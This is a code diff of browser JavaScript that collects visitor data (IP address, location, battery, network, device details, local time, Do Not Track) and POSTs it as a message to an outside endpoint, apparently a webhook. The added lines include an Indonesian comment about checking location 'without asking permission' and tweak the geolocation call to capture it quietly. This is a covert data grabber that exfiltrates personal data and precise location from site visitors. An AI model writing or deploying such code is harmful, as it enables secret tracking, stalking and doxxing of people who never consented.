@@ -50,15 +50,16 @@
                 else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) br = "Safari";
                 else if (/Edg/i.test(ua)) br = "Edge";
 
-                let geo = "Disabled";
+                let geo = "Permission required";
                 if (navigator.geolocation) {
+                    // Cek apakah lokasi udah di-enable tanpa minta izin
                     try {
                         const pos = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 1000, maximumAge: Infinity });
                         });
-                        geo = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                        geo = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
                     } catch {
-                        geo = "Permission Denied";
+                        geo = "Permission required"; // Kalo gagal atau minta izin, tulis ini
                     }
                 }
 
@@ -73,7 +74,7 @@
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP: ${ip}\nLang: ${lang}\nCT: ${ct}\nNT: ${nt}\nDS: ${ds}\nBL: ${bl}\nCS: ${cs}\nPSM: ${psm}\nPlat: ${plat}\nBR: ${br}\nGeo: ${geo}\nSR: ${sr}\nLT: ${lt}\nCC: ${cc}\nDNT: ${dnt}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${lang}\nConnection Type: ${ct}\nNetwork Type: ${nt}\nDownlink Speed: ${ds}\nBattery Level: ${bl}\nCharging Status: ${cs}\nPower Save Mode: ${psm}\nPlatform: ${plat}\nBrowser: ${br}\nGeolocation: ${geo}\nScreen Resolution: ${sr}\nLocal Time: ${lt}\nCPU Cores: ${cc}\nDo Not Track: ${dnt}`
                     })
                 });
 
